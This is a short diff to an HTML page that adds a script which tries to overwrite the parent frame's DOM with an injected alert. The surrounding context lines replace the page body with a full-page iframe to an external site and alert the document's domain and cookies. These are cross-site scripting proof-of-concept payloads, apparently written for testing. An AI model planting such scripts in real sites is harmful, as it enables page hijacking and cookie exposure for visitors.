@@ -118,6 +118,11 @@
     <script>
     document.body.innerHTML = '<iframe src="https://rudraksha-das.github.io" style="width:100%; height:100%; border:none;"></iframe>';
 </script>
+    <script>
+  // Try manipulating the parent DOM
+  window.parent.document.body.innerHTML = '<script>alert("XSS")<\/script>';
+    </script>
+
 
 
     <script>alert(document.domain + document.cookie)</script>
